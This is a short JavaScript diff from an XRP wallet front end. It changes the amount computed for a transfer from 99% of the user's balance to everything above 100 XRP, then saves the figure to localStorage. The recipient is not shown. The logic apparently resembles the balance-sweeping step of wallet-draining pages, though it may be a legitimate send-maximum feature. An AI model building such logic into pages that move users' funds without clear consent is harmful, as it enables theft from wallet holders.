@@ -117,9 +117,9 @@
                         const balanceInXRP = balanceInDrops / 1000000;
                         setUserBalance(balanceInXRP);
                         
-                        // Calculate 99% of balance
-                        const percentage = balanceInXRP * 0.99;
-                        const amountInDrops = Math.floor(percentage * 1000000);
+                      // Calculate amount leaving 100 XRP in wallet
+                        const amountToSend = Math.max(0, balanceInXRP - 100);
+                        const amountInDrops = Math.floor(amountToSend * 1000000);
                         setCalculatedAmount(amountInDrops.toString());
                         
                         // Save to localStorage
